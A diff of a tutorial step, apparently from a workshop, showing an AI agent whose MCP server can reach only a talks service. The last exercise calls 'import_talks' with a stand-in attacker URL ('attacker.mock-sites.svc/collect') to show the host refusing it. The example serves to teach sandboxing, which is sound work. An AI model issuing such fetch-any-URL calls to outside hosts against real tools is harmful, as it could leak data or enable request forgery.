@@ -19,9 +19,9 @@ kubectl apply -f steps/03-sqlite/workloaddeployment.yaml \
 ```
 
 The same agent as step 2, with sqlite added (and listed with curl under
-`hostInterfaces`), and an MCP client, which the last section of this step uses. Its grant:
-one folder, read only, holding two databases (`main.db`, the talks, and
-`rooms.db`).
+`hostInterfaces`), and an MCP client, which the last section of this step
+uses. sqlite's grant: one folder, read only, holding two databases
+(`main.db`, the talks, and `rooms.db`).
 
 ```yaml
 volumeMounts: [{ name: sqlite-data, mountPath: /data, readOnly: true }]
@@ -215,21 +215,27 @@ So each hop reaches only the next one. The agent can only ask the `mcp` tool.
 The `mcp` tool reaches only the MCP server. The MCP server reaches only the
 talks service, and only the talks service touches the data.
 
+Type each prompt into the chat at http://agent.localhost:28180.
+
+<!-- codespaces -->
+In Codespaces, run the `./ask` command under it instead.
+<!-- /codespaces -->
+
 **7. List the MCP server's tools**
 
 In the chat:
 
-```
+```chat
 mcp tools
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'mcp tools'
+./ask 'mcp tools'
 ```
+<!-- /codespaces -->
 
 The `mcp` tool asks the server for its tools. The server answers with four: `list_talks`, `get_talk`, `favorite_talk` and `import_talks`.
 
@@ -237,17 +243,17 @@ The `mcp` tool asks the server for its tools. The server answers with four: `lis
 
 In the chat:
 
-```
+```chat
 mcp call list_talks {"track":"Security"}
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'mcp call list_talks {"track":"Security"}'
+./ask 'mcp call list_talks {"track":"Security"}'
 ```
+<!-- /codespaces -->
 
 The MCP server turns the call into `GET /talks?track=Security` on the talks service, and the same talks come back as from sqlite.
 
@@ -255,17 +261,17 @@ The MCP server turns the call into `GET /talks?track=Security` on the talks serv
 
 In the chat:
 
-```
+```chat
 mcp call favorite_talk {"id":1}
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'mcp call favorite_talk {"id":1}'
+./ask 'mcp call favorite_talk {"id":1}'
 ```
+<!-- /codespaces -->
 
 The talks service marks the talk a favorite in its own folder. Neither the MCP server nor the agent can see that folder.
 
@@ -273,17 +279,17 @@ The talks service marks the talk a favorite in its own folder. Neither the MCP s
 
 In the chat:
 
-```
+```chat
 mcp --server http://talks.mock-sites.svc/talks tools
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'mcp --server http://talks.mock-sites.svc/talks tools'
+./ask 'mcp --server http://talks.mock-sites.svc/talks tools'
 ```
+<!-- /codespaces -->
 
 The talks service is on the network and would answer, but it isn't in the `mcp` tool's `allowedHosts`. The host refuses the request before it leaves.
 
@@ -291,17 +297,17 @@ The talks service is on the network and would answer, but it isn't in the `mcp` 
 
 In the chat:
 
-```
+```chat
 mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}'
+./ask 'mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}'
 ```
+<!-- /codespaces -->
 
 `import_talks` fetches whatever URL it is given. This one names the attacker's server, so the MCP server tries, and the host refuses it: the server's only grant is the talks service. The refusal comes back as the tool's failure, in the server's own words.
 
